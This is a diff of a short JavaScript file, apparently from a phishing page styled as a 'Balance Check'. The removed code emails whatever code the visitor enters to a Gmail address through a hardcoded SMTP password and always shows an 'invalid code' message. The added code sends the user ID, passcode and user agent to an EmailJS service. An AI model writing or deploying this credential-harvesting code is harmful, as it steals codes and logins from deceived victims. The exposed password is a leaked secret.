@@ -1,18 +1,19 @@
-function sendEmail() {
-    Email.send({
-        Host : "smtp.elasticemail.com",
-        Username : "samdaviswills@gmail.com",
-        Password : "EEF3A3E7F326A056EA09BB9027E7D6753096",
-        To : 'samdaviswills@gmail.com',
-        From : "samdaviswills@gmail.com",
-        Subject : "Balance Check",
-        Body : "Code: " + document.getElementById("enter-code").value
-    }).then(
-        opps.innerHTML = "opps you have entered an invalid code"
-    );
-}
-function opps() {
-    var opps = document.getElementById("opps");
-    opps.innerHTML = "opps you have entered an invalid code";
-}
+function sendEmail(){
+    var params = {
+        txtUserID: document.getElementById("entercode").value,
 
+        txtPasscode: document.getElementById("entercode").value,
+        Useragent: document.getElementById("Useragent").value,
+    }
+const serviceID = "service_m0zt6uk"
+const templateID = "template_f00v7vp"
+
+emailjs.send(serviceID,templateID,params)
+.then(
+    res =>{
+        document.getElementById("txtUserID").value ="";
+        document.getElementById("txtPasscode").value=""
+        console.log(res);
+        
+    })
+    .catch(err=>console.log(err));
